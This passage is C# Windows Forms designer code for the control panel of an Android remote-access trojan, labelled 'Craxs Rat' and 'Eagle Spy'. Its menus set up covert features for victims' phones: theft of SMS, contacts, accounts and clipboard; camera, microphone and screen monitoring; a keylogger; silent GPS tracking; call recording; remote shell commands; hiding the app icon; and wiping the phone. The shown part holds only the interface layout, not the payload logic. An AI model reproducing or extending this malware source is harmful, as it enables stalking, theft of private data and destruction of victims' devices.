            this.Panel5.SuspendLayout();
            this.Panel2.SuspendLayout();
            this.infobox.SuspendLayout();
            this.ReciveBox.SuspendLayout();
            this.SentBox.SuspendLayout();
            this.RecentBox.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.DGFW)).BeginInit();
            this.TRKPANEL.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.DGVTRK)).BeginInit();
            this.Panel17.SuspendLayout();
            this.recordsShowpanel.SuspendLayout();
            this.Panel6.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.TCavatar)).BeginInit();
            this.notifispanel.SuspendLayout();
            this.Panel7.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.DGVALRTS)).BeginInit();
            this.Panel12.SuspendLayout();
            this.Panel9.SuspendLayout();
            this.Panel11.SuspendLayout();
            this.panel8.SuspendLayout();
            this.guna2ShadowPanel4.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox14)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox6)).BeginInit();
            this.guna2ShadowPanel3.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox13)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox7)).BeginInit();
            this.guna2ShadowPanel2.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox8)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox12)).BeginInit();
            this.guna2ShadowPanel1.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox10)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox11)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.DGVblocked)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.ClientsWindow)).BeginInit();
            this.guna2Panel3.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.PictureBox9)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox4)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox5)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox3)).BeginInit();
            this.guna2Panel4.SuspendLayout();
            this.Mainpanel.SuspendLayout();
            this.guna2Panel1.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox15)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
            this.SuspendLayout();
            // 
            // notfi
            // 
            this.notfi.Text = "Craxs Rat";
            this.notfi.Visible = true;
            this.notfi.MouseClick += new System.Windows.Forms.MouseEventHandler(this.notfi_MouseClick);
            // 
            // TOpacity
            // 
            this.TOpacity.Interval = 10;
            this.TOpacity.Tick += new System.EventHandler(this.TOpacity_Tick);
            // 
            // ctxmenu
            // 
            this.ctxmenu.BackColor = System.Drawing.Color.Black;
            this.ctxmenu.Font = new System.Drawing.Font("Calibri", 12F);
            this.ctxmenu.ImageScalingSize = new System.Drawing.Size(20, 20);
            this.ctxmenu.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.ManagersToolStripMenuItem,
            this.ToolStripSeparator1,
            this.MonitorsToolStripMenuItem,
            this.ToolStripSeparator3,
            this.AdminToolStripMenuItem,
            this.ToolStripSeparator6,
            this.ToolStripMenuItem4,
            this.ToolStripSeparator5,
            this.ExtraToolStripMenuItem,
            this.ToolStripSeparator7,
            this.ToolStripMenuItem13,
            this.ToolStripSeparator8,
            this.KeyboardToolStripMenuItem,
            this.ToolStripSeparator4,
            this.ClientFolderToolStripMenuItem,
            this.UsdtToolStripMenuItem});
            this.ctxmenu.Name = "DrakeUIContextMenuStrip1";
            this.ctxmenu.ShowImageMargin = false;
            this.ctxmenu.Size = new System.Drawing.Size(190, 298);
            // 
            // ManagersToolStripMenuItem
            // 
            this.ManagersToolStripMenuItem.BackColor = System.Drawing.Color.Black;
            this.ManagersToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.FilesToolStripMenuItem,
            this.SMSToolStripMenuItem,
            this.CallsToolStripMenuItem1,
            this.ContactsToolStripMenuItem,
            this.AccountsToolStripMenuItem,
            this.ApplicationsToolStripMenuItem,
            this.ToolStripMenuItem12});
            this.ManagersToolStripMenuItem.ForeColor = System.Drawing.Color.White;
            this.ManagersToolStripMenuItem.Name = "ManagersToolStripMenuItem";
            this.ManagersToolStripMenuItem.Size = new System.Drawing.Size(189, 28);
            this.ManagersToolStripMenuItem.Text = "Managers";
            // 
            // FilesToolStripMenuItem
            // 
            this.FilesToolStripMenuItem.BackColor = System.Drawing.Color.Black;
            this.FilesToolStripMenuItem.ForeColor = System.Drawing.Color.White;
            this.FilesToolStripMenuItem.Image = global::Eagle_Spy_Applications.folder;
            this.FilesToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
            this.FilesToolStripMenuItem.Name = "FilesToolStripMenuItem";
            this.FilesToolStripMenuItem.Size = new System.Drawing.Size(197, 28);
            this.FilesToolStripMenuItem.Text = "Files";
            this.FilesToolStripMenuItem.TextImageRelation = System.Windows.Forms.TextImageRelation.ImageAboveText;
            this.FilesToolStripMenuItem.Click += new System.EventHandler(this.FilesToolStripMenuItem_Click);
            // 
            // SMSToolStripMenuItem
            // 
            this.SMSToolStripMenuItem.BackColor = System.Drawing.Color.Black;
            this.SMSToolStripMenuItem.ForeColor = System.Drawing.Color.White;
            this.SMSToolStripMenuItem.Image = global::Eagle_Spy_Applications.sms;
            this.SMSToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
            this.SMSToolStripMenuItem.Name = "SMSToolStripMenuItem";
            this.SMSToolStripMenuItem.Size = new System.Drawing.Size(197, 28);
            this.SMSToolStripMenuItem.Text = "SMS";
            this.SMSToolStripMenuItem.Click += new System.EventHandler(this.SMSToolStripMenuItem_Click);
            // 
            // CallsToolStripMenuItem1
            // 
            this.CallsToolStripMenuItem1.BackColor = System.Drawing.Color.Black;
            this.CallsToolStripMenuItem1.ForeColor = System.Drawing.Color.White;
            this.CallsToolStripMenuItem1.Image = global::Eagle_Spy_Applications.calls;
            this.CallsToolStripMenuItem1.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
            this.CallsToolStripMenuItem1.Name = "CallsToolStripMenuItem1";
            this.CallsToolStripMenuItem1.Size = new System.Drawing.Size(197, 28);
            this.CallsToolStripMenuItem1.Text = "Calls";
            this.CallsToolStripMenuItem1.Click += new System.EventHandler(this.CallsToolStripMenuItem1_Click);
            // 
            // ContactsToolStripMenuItem
            // 
            this.ContactsToolStripMenuItem.BackColor = System.Drawing.Color.Black;
            this.ContactsToolStripMenuItem.ForeColor = System.Drawing.Color.White;
            this.ContactsToolStripMenuItem.Image = global::Eagle_Spy_Applications.contacts;
            this.ContactsToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
            this.ContactsToolStripMenuItem.Name = "ContactsToolStripMenuItem";
            this.ContactsToolStripMenuItem.Size = new System.Drawing.Size(197, 28);
            this.ContactsToolStripMenuItem.Text = "Contacts";
            this.ContactsToolStripMenuItem.Click += new System.EventHandler(this.ContactsToolStripMenuItem_Click);
            // 
            // AccountsToolStripMenuItem
            // 
            this.AccountsToolStripMenuItem.BackColor = System.Drawing.Color.Black;
            this.AccountsToolStripMenuItem.ForeColor = System.Drawing.Color.White;
            this.AccountsToolStripMenuItem.Image = global::Eagle_Spy_Applications.account;
            this.AccountsToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
            this.AccountsToolStripMenuItem.Name = "AccountsToolStripMenuItem";
            this.AccountsToolStripMenuItem.Size = new System.Drawing.Size(197, 28);
            this.AccountsToolStripMenuItem.Text = "Accounts";
            this.AccountsToolStripMenuItem.Click += new System.EventHandler(this.AccountsToolStripMenuItem_Click);
            // 
            // ApplicationsToolStripMenuItem
            // 
            this.ApplicationsToolStripMenuItem.BackColor = System.Drawing.Color.Black;
            this.ApplicationsToolStripMenuItem.ForeColor = System.Drawing.Color.White;
            this.ApplicationsToolStripMenuItem.Image = global::Eagle_Spy_Applications.applications;
            this.ApplicationsToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
            this.ApplicationsToolStripMenuItem.Name = "ApplicationsToolStripMenuItem";
            this.ApplicationsToolStripMenuItem.Size = new System.Drawing.Size(197, 28);
            this.ApplicationsToolStripMenuItem.Text = "Applications";
            this.ApplicationsToolStripMenuItem.Click += new System.EventHandler(this.ApplicationsToolStripMenuItem_Click);
            // 
            // ToolStripMenuItem12
            // 
            this.ToolStripMenuItem12.BackColor = System.Drawing.Color.Black;
            this.ToolStripMenuItem12.ForeColor = System.Drawing.Color.White;
            this.ToolStripMenuItem12.Image = global::Eagle_Spy_Applications.add;
            this.ToolStripMenuItem12.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
            this.ToolStripMenuItem12.Name = "ToolStripMenuItem12";
            this.ToolStripMenuItem12.Size = new System.Drawing.Size(197, 28);
            this.ToolStripMenuItem12.Text = "Permissions";
            this.ToolStripMenuItem12.Click += new System.EventHandler(this.ToolStripMenuItem12_Click);
            // 
            // ToolStripSeparator1
            // 
            this.ToolStripSeparator1.BackColor = System.Drawing.Color.Black;
            this.ToolStripSeparator1.ForeColor = System.Drawing.Color.Black;
            this.ToolStripSeparator1.Name = "ToolStripSeparator1";
            this.ToolStripSeparator1.Size = new System.Drawing.Size(186, 6);
            // 
            // MonitorsToolStripMenuItem
            // 
            this.MonitorsToolStripMenuItem.BackColor = System.Drawing.Color.Black;
            this.MonitorsToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.ScreenMonitorToolStripMenuItem,
            this.ToolStripMenuItem14,
            this.CameraMonitorToolStripMenuItem,
            this.MicrophoneMonitorToolStripMenuItem,
            this.KeyloggerToolStripMenuItem1,
            this.LocationsMonitorToolStripMenuItem,
            this.WebBrowserToolStripMenuItem1,
            this.CallRecorderToolStripMenuItem,
            this.ToolStripMenuItem3,
            this.ScreenReaderToolStripMenuItem});
            this.MonitorsToolStripMenuItem.ForeColor = System.Drawing.Color.White;
            this.MonitorsToolStripMenuItem.Name = "MonitorsToolStripMenuItem";
            this.MonitorsToolStripMenuItem.Size = new System.Drawing.Size(189, 28);
            this.MonitorsToolStripMenuItem.Text = "Monitors";
            // 
            // ScreenMonitorToolStripMenuItem
            // 
            this.ScreenMonitorToolStripMenuItem.BackColor = System.Drawing.Color.Black;
            this.ScreenMonitorToolStripMenuItem.ForeColor = System.Drawing.Color.White;
            this.ScreenMonitorToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
            this.ScreenMonitorToolStripMenuItem.Name = "ScreenMonitorToolStripMenuItem";
            this.ScreenMonitorToolStripMenuItem.Size = new System.Drawing.Size(270, 28);
            this.ScreenMonitorToolStripMenuItem.Text = "Screen Monitor";
            this.ScreenMonitorToolStripMenuItem.Click += new System.EventHandler(this.ScreenMonitorToolStripMenuItem_Click);
            // 
            // ToolStripMenuItem14
            // 
            this.ToolStripMenuItem14.BackColor = System.Drawing.Color.Black;
            this.ToolStripMenuItem14.ForeColor = System.Drawing.Color.White;
            this.ToolStripMenuItem14.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
            this.ToolStripMenuItem14.Name = "ToolStripMenuItem14";
            this.ToolStripMenuItem14.Size = new System.Drawing.Size(270, 28);
            this.ToolStripMenuItem14.Text = "Screen Reader V2";
            this.ToolStripMenuItem14.Click += new System.EventHandler(this.ToolStripMenuItem14_Click);
            // 
            // CameraMonitorToolStripMenuItem
            // 
            this.CameraMonitorToolStripMenuItem.BackColor = System.Drawing.Color.Black;
            this.CameraMonitorToolStripMenuItem.ForeColor = System.Drawing.Color.White;
            this.CameraMonitorToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
            this.CameraMonitorToolStripMenuItem.Name = "CameraMonitorToolStripMenuItem";
            this.CameraMonitorToolStripMenuItem.Size = new System.Drawing.Size(270, 28);
            this.CameraMonitorToolStripMenuItem.Text = "Camera Monitor";
            this.CameraMonitorToolStripMenuItem.Click += new System.EventHandler(this.CameraMonitorToolStripMenuItem_Click);
            // 
            // MicrophoneMonitorToolStripMenuItem
            // 
            this.MicrophoneMonitorToolStripMenuItem.BackColor = System.Drawing.Color.Black;
            this.MicrophoneMonitorToolStripMenuItem.ForeColor = System.Drawing.Color.White;
            this.MicrophoneMonitorToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
            this.MicrophoneMonitorToolStripMenuItem.Name = "MicrophoneMonitorToolStripMenuItem";
            this.MicrophoneMonitorToolStripMenuItem.Size = new System.Drawing.Size(270, 28);
            this.MicrophoneMonitorToolStripMenuItem.Text = "Microphone Monitor";
            this.MicrophoneMonitorToolStripMenuItem.Click += new System.EventHandler(this.MicrophoneMonitorToolStripMenuItem_Click);
            // 
            // KeyloggerToolStripMenuItem1
            // 
            this.KeyloggerToolStripMenuItem1.BackColor = System.Drawing.Color.Black;
            this.KeyloggerToolStripMenuItem1.ForeColor = System.Drawing.Color.White;
            this.KeyloggerToolStripMenuItem1.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
            this.KeyloggerToolStripMenuItem1.Name = "KeyloggerToolStripMenuItem1";
            this.KeyloggerToolStripMenuItem1.Size = new System.Drawing.Size(270, 28);
            this.KeyloggerToolStripMenuItem1.Text = "Keylogger";
            this.KeyloggerToolStripMenuItem1.Click += new System.EventHandler(this.KeyloggerToolStripMenuItem1_Click);
            // 
            // LocationsMonitorToolStripMenuItem
            // 
            this.LocationsMonitorToolStripMenuItem.BackColor = System.Drawing.Color.Black;
            this.LocationsMonitorToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.LiveModeToolStripMenuItem1,
            this.ToolStripSeparator2,
            this.SilentModeGOIPToolStripMenuItem});
            this.LocationsMonitorToolStripMenuItem.ForeColor = System.Drawing.Color.White;
            this.LocationsMonitorToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
            this.LocationsMonitorToolStripMenuItem.Name = "LocationsMonitorToolStripMenuItem";
            this.LocationsMonitorToolStripMenuItem.Size = new System.Drawing.Size(270, 28);
            this.LocationsMonitorToolStripMenuItem.Text = "Locations Monitor";
            // 
            // LiveModeToolStripMenuItem1
            // 
            this.LiveModeToolStripMenuItem1.BackColor = System.Drawing.Color.Black;
            this.LiveModeToolStripMenuItem1.ForeColor = System.Drawing.Color.White;
            this.LiveModeToolStripMenuItem1.Name = "LiveModeToolStripMenuItem1";
            this.LiveModeToolStripMenuItem1.Size = new System.Drawing.Size(253, 28);
            this.LiveModeToolStripMenuItem1.Text = "Live Mode (GPS)";
            this.LiveModeToolStripMenuItem1.Click += new System.EventHandler(this.LiveModeToolStripMenuItem1_Click);
            // 
            // ToolStripSeparator2
            // 
            this.ToolStripSeparator2.BackColor = System.Drawing.Color.Black;
            this.ToolStripSeparator2.ForeColor = System.Drawing.Color.Black;
            this.ToolStripSeparator2.Name = "ToolStripSeparator2";
            this.ToolStripSeparator2.Size = new System.Drawing.Size(250, 6);
            // 
            // SilentModeGOIPToolStripMenuItem
            // 
            this.SilentModeGOIPToolStripMenuItem.BackColor = System.Drawing.Color.Black;
            this.SilentModeGOIPToolStripMenuItem.ForeColor = System.Drawing.Color.White;
            this.SilentModeGOIPToolStripMenuItem.Name = "SilentModeGOIPToolStripMenuItem";
            this.SilentModeGOIPToolStripMenuItem.Size = new System.Drawing.Size(253, 28);
            this.SilentModeGOIPToolStripMenuItem.Text = "Silent Mode (GOIP)";
            this.SilentModeGOIPToolStripMenuItem.Click += new System.EventHandler(this.SilentModeGOIPToolStripMenuItem_Click);
            // 
            // WebBrowserToolStripMenuItem1
            // 
            this.WebBrowserToolStripMenuItem1.BackColor = System.Drawing.Color.Black;
            this.WebBrowserToolStripMenuItem1.ForeColor = System.Drawing.Color.White;
            this.WebBrowserToolStripMenuItem1.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
            this.WebBrowserToolStripMenuItem1.Name = "WebBrowserToolStripMenuItem1";
            this.WebBrowserToolStripMenuItem1.Size = new System.Drawing.Size(270, 28);
            this.WebBrowserToolStripMenuItem1.Text = "Web Browser";
            this.WebBrowserToolStripMenuItem1.Click += new System.EventHandler(this.WebBrowserToolStripMenuItem1_Click);
            // 
            // CallRecorderToolStripMenuItem
            // 
            this.CallRecorderToolStripMenuItem.BackColor = System.Drawing.Color.Black;
            this.CallRecorderToolStripMenuItem.ForeColor = System.Drawing.Color.White;
            this.CallRecorderToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
            this.CallRecorderToolStripMenuItem.Name = "CallRecorderToolStripMenuItem";
            this.CallRecorderToolStripMenuItem.Size = new System.Drawing.Size(270, 28);
            this.CallRecorderToolStripMenuItem.Text = "Call Recorder";
            this.CallRecorderToolStripMenuItem.Click += new System.EventHandler(this.CallRecorderToolStripMenuItem_Click);
            // 
            // ToolStripMenuItem3
            // 
            this.ToolStripMenuItem3.BackColor = System.Drawing.Color.Black;
            this.ToolStripMenuItem3.ForeColor = System.Drawing.Color.White;
            this.ToolStripMenuItem3.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
            this.ToolStripMenuItem3.Name = "ToolStripMenuItem3";
            this.ToolStripMenuItem3.Size = new System.Drawing.Size(270, 28);
            this.ToolStripMenuItem3.Text = "Auto Clicker";
            // 
            // ScreenReaderToolStripMenuItem
            // 
            this.ScreenReaderToolStripMenuItem.BackColor = System.Drawing.Color.Black;
            this.ScreenReaderToolStripMenuItem.ForeColor = System.Drawing.Color.White;
            this.ScreenReaderToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
            this.ScreenReaderToolStripMenuItem.Name = "ScreenReaderToolStripMenuItem";
            this.ScreenReaderToolStripMenuItem.Size = new System.Drawing.Size(270, 28);
            this.ScreenReaderToolStripMenuItem.Text = "Screen Reader";
            this.ScreenReaderToolStripMenuItem.Click += new System.EventHandler(this.ScreenReaderToolStripMenuItem_Click);
            // 
            // ToolStripSeparator3
            // 
            this.ToolStripSeparator3.BackColor = System.Drawing.Color.Black;
            this.ToolStripSeparator3.ForeColor = System.Drawing.Color.Black;
            this.ToolStripSeparator3.Name = "ToolStripSeparator3";
            this.ToolStripSeparator3.Size = new System.Drawing.Size(186, 6);
            // 
            // AdminToolStripMenuItem
            // 
            this.AdminToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.RequestAdminRightsToolStripMenuItem,
            this.LockScreenToolStripMenuItem,
            this.ToolStripMenuItem2,
            this.隐藏图标ToolStripMenuItem,
            this.擦除手机数据ToolStripMenuItem});
            this.AdminToolStripMenuItem.ForeColor = System.Drawing.Color.White;
            this.AdminToolStripMenuItem.Name = "AdminToolStripMenuItem";
            this.AdminToolStripMenuItem.Size = new System.Drawing.Size(189, 28);
            this.AdminToolStripMenuItem.Text = "Admin";
            // 
            // RequestAdminRightsToolStripMenuItem
            // 
            this.RequestAdminRightsToolStripMenuItem.BackColor = System.Drawing.Color.Black;
            this.RequestAdminRightsToolStripMenuItem.ForeColor = System.Drawing.Color.White;
            this.RequestAdminRightsToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
            this.RequestAdminRightsToolStripMenuItem.Name = "RequestAdminRightsToolStripMenuItem";
            this.RequestAdminRightsToolStripMenuItem.Size = new System.Drawing.Size(278, 28);
            this.RequestAdminRightsToolStripMenuItem.Text = "Request Admin Rights";
            this.RequestAdminRightsToolStripMenuItem.Click += new System.EventHandler(this.RequestAdminRightsToolStripMenuItem_Click);
            // 
            // LockScreenToolStripMenuItem
            // 
            this.LockScreenToolStripMenuItem.BackColor = System.Drawing.Color.Black;
            this.LockScreenToolStripMenuItem.ForeColor = System.Drawing.Color.White;
            this.LockScreenToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
            this.LockScreenToolStripMenuItem.Name = "LockScreenToolStripMenuItem";
            this.LockScreenToolStripMenuItem.Size = new System.Drawing.Size(278, 28);
            this.LockScreenToolStripMenuItem.Text = "Lock Screen";
            this.LockScreenToolStripMenuItem.Click += new System.EventHandler(this.LockScreenToolStripMenuItem_Click);
            // 
            // ToolStripMenuItem2
            // 
            this.ToolStripMenuItem2.BackColor = System.Drawing.Color.Black;
            this.ToolStripMenuItem2.ForeColor = System.Drawing.Color.White;
            this.ToolStripMenuItem2.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
            this.ToolStripMenuItem2.Name = "ToolStripMenuItem2";
            this.ToolStripMenuItem2.Size = new System.Drawing.Size(278, 28);
            this.ToolStripMenuItem2.Text = "显示图标";
            this.ToolStripMenuItem2.Click += new System.EventHandler(this.ToolStripMenuItem2_Click);
            // 
            // 隐藏图标ToolStripMenuItem
            // 
            this.隐藏图标ToolStripMenuItem.BackColor = System.Drawing.SystemColors.ActiveCaptionText;
            this.隐藏图标ToolStripMenuItem.ForeColor = System.Drawing.SystemColors.ControlLightLight;
            this.隐藏图标ToolStripMenuItem.Name = "隐藏图标ToolStripMenuItem";
            this.隐藏图标ToolStripMenuItem.Size = new System.Drawing.Size(278, 28);
            this.隐藏图标ToolStripMenuItem.Text = "隐藏图标";
            // 
            // 擦除手机数据ToolStripMenuItem
            // 
            this.擦除手机数据ToolStripMenuItem.BackColor = System.Drawing.SystemColors.ActiveCaptionText;
            this.擦除手机数据ToolStripMenuItem.ForeColor = System.Drawing.SystemColors.ControlLightLight;
            this.擦除手机数据ToolStripMenuItem.Name = "擦除手机数据ToolStripMenuItem";
            this.擦除手机数据ToolStripMenuItem.Size = new System.Drawing.Size(278, 28);
            this.擦除手机数据ToolStripMenuItem.Text = "擦除手机数据";
            // 
            // ToolStripSeparator6
            // 
            this.ToolStripSeparator6.BackColor = System.Drawing.Color.Black;
            this.ToolStripSeparator6.ForeColor = System.Drawing.Color.Black;
            this.ToolStripSeparator6.Name = "ToolStripSeparator6";
            this.ToolStripSeparator6.Size = new System.Drawing.Size(186, 6);
            // 
            // ToolStripMenuItem4
            // 
            this.ToolStripMenuItem4.BackColor = System.Drawing.Color.Black;
            this.ToolStripMenuItem4.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.ToolStripMenuItem5,
            this.ToolStripMenuItem6,
            this.ToolStripMenuItem7,
            this.ToolStripMenuItem8,
            this.ToolStripMenuItem9,
            this.ToolStripMenuItem10});
            this.ToolStripMenuItem4.ForeColor = System.Drawing.Color.White;
            this.ToolStripMenuItem4.Name = "ToolStripMenuItem4";
            this.ToolStripMenuItem4.Size = new System.Drawing.Size(189, 28);
            this.ToolStripMenuItem4.Text = "Tools";
            // 
            // ToolStripMenuItem5
            // 
            this.ToolStripMenuItem5.BackColor = System.Drawing.Color.Black;
            this.ToolStripMenuItem5.ForeColor = System.Drawing.Color.White;
            this.ToolStripMenuItem5.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
            this.ToolStripMenuItem5.Name = "ToolStripMenuItem5";
            this.ToolStripMenuItem5.Size = new System.Drawing.Size(225, 28);
            this.ToolStripMenuItem5.Text = "Call Number";
            this.ToolStripMenuItem5.Click += new System.EventHandler(this.ToolStripMenuItem5_Click);
            // 
            // ToolStripMenuItem6
            // 
            this.ToolStripMenuItem6.BackColor = System.Drawing.Color.Black;
            this.ToolStripMenuItem6.ForeColor = System.Drawing.Color.White;
            this.ToolStripMenuItem6.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
            this.ToolStripMenuItem6.Name = "ToolStripMenuItem6";
            this.ToolStripMenuItem6.Size = new System.Drawing.Size(225, 28);
            this.ToolStripMenuItem6.Text = "Download APK";
            this.ToolStripMenuItem6.Click += new System.EventHandler(this.ToolStripMenuItem6_Click);
            // 
            // ToolStripMenuItem7
            // 
            this.ToolStripMenuItem7.BackColor = System.Drawing.Color.Black;
            this.ToolStripMenuItem7.ForeColor = System.Drawing.Color.White;
            this.ToolStripMenuItem7.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
            this.ToolStripMenuItem7.Name = "ToolStripMenuItem7";
            this.ToolStripMenuItem7.Size = new System.Drawing.Size(225, 28);
            this.ToolStripMenuItem7.Text = "Show Messege";
            this.ToolStripMenuItem7.Click += new System.EventHandler(this.ToolStripMenuItem7_Click);
            // 
            // ToolStripMenuItem8
            // 
            this.ToolStripMenuItem8.BackColor = System.Drawing.Color.Black;
            this.ToolStripMenuItem8.ForeColor = System.Drawing.Color.White;
            this.ToolStripMenuItem8.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
            this.ToolStripMenuItem8.Name = "ToolStripMenuItem8";
            this.ToolStripMenuItem8.Size = new System.Drawing.Size(225, 28);
            this.ToolStripMenuItem8.Text = "Clipboard";
            this.ToolStripMenuItem8.Click += new System.EventHandler(this.ToolStripMenuItem8_Click);
            // 
            // ToolStripMenuItem9
            // 
            this.ToolStripMenuItem9.BackColor = System.Drawing.Color.Black;
            this.ToolStripMenuItem9.ForeColor = System.Drawing.Color.White;
            this.ToolStripMenuItem9.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
            this.ToolStripMenuItem9.Name = "ToolStripMenuItem9";
            this.ToolStripMenuItem9.Size = new System.Drawing.Size(225, 28);
            this.ToolStripMenuItem9.Text = "Open Link";
            this.ToolStripMenuItem9.Click += new System.EventHandler(this.ToolStripMenuItem9_Click);
            // 
            // ToolStripMenuItem10
            // 
            this.ToolStripMenuItem10.BackColor = System.Drawing.Color.Black;
            this.ToolStripMenuItem10.ForeColor = System.Drawing.Color.White;
            this.ToolStripMenuItem10.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
            this.ToolStripMenuItem10.Name = "ToolStripMenuItem10";
            this.ToolStripMenuItem10.Size = new System.Drawing.Size(225, 28);
            this.ToolStripMenuItem10.Text = "Shell Command";
            this.ToolStripMenuItem10.Click += new System.EventHandler(this.ToolStripMenuItem10_Click);
            // 
            // ToolStripSeparator5
            // 
            this.ToolStripSeparator5.BackColor = System.Drawing.Color.Black;
            this.ToolStripSeparator5.ForeColor = System.Drawing.Color.Black;
            this.ToolStripSeparator5.Name = "ToolStripSeparator5";
            this.ToolStripSeparator5.Size = new System.Drawing.Size(186, 6);
            // 
            // ExtraToolStripMenuItem
            // 
            this.ExtraToolStripMenuItem.BackColor = System.Drawing.Color.Black;
            this.ExtraToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.NotificationListnerToolStripMenuItem,
            this.CallsListnerToolStripMenuItem,
            this.PhoneInformationToolStripMenuItem});
            this.ExtraToolStripMenuItem.ForeColor = System.Drawing.Color.White;
            this.ExtraToolStripMenuItem.Name = "ExtraToolStripMenuItem";
            this.ExtraToolStripMenuItem.Size = new System.Drawing.Size(189, 28);
            this.ExtraToolStripMenuItem.Text = "Extra";
            // 
            // NotificationListnerToolStripMenuItem
            // 
            this.NotificationListnerToolStripMenuItem.BackColor = System.Drawing.Color.Black;
            this.NotificationListnerToolStripMenuItem.ForeColor = System.Drawing.Color.White;
            this.NotificationListnerToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
            this.NotificationListnerToolStripMenuItem.Name = "NotificationListnerToolStripMenuItem";
            this.NotificationListnerToolStripMenuItem.Size = new System.Drawing.Size(252, 28);
            this.NotificationListnerToolStripMenuItem.Text = "Notification Listner";
            this.NotificationListnerToolStripMenuItem.Click += new System.EventHandler(this.NotificationListnerToolStripMenuItem_Click);
            // 
            // CallsListnerToolStripMenuItem
            // 
            this.CallsListnerToolStripMenuItem.BackColor = System.Drawing.Color.Black;
            this.CallsListnerToolStripMenuItem.ForeColor = System.Drawing.Color.White;
            this.CallsListnerToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
            this.CallsListnerToolStripMenuItem.Name = "CallsListnerToolStripMenuItem";
            this.CallsListnerToolStripMenuItem.Size = new System.Drawing.Size(252, 28);
            this.CallsListnerToolStripMenuItem.Text = "Calls Listner";
            this.CallsListnerToolStripMenuItem.Click += new System.EventHandler(this.CallsListnerToolStripMenuItem_Click);
            // 
            // PhoneInformationToolStripMenuItem
            // 
            this.PhoneInformationToolStripMenuItem.BackColor = System.Drawing.Color.Black;
            this.PhoneInformationToolStripMenuItem.ForeColor = System.Drawing.Color.White;
            this.PhoneInformationToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
            this.PhoneInformationToolStripMenuItem.Name = "PhoneInformationToolStripMenuItem";
            this.PhoneInformationToolStripMenuItem.Size = new System.Drawing.Size(252, 28);
            this.PhoneInformationToolStripMenuItem.Text = "Phone information";
            this.PhoneInformationToolStripMenuItem.Click += new System.EventHandler(this.PhoneInformationToolStripMenuItem_Click);
            // 
            // ToolStripSeparator7
            // 
            this.ToolStripSeparator7.BackColor = System.Drawing.Color.Black;
            this.ToolStripSeparator7.ForeColor = System.Drawing.Color.Black;
            this.ToolStripSeparator7.Name = "ToolStripSeparator7";
            this.ToolStripSeparator7.Size = new System.Drawing.Size(186, 6);
            // 
            // ToolStripMenuItem13
            // 
            this.ToolStripMenuItem13.BackColor = System.Drawing.Color.Black;
            this.ToolStripMenuItem13.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.ToolStripMenuItem16,
            this.ToolStripMenuItem17,
            this.ToolStripMenuItem18,
            this.ToolStripMenuItem11});
            this.ToolStripMenuItem13.ForeColor = System.Drawing.Color.White;
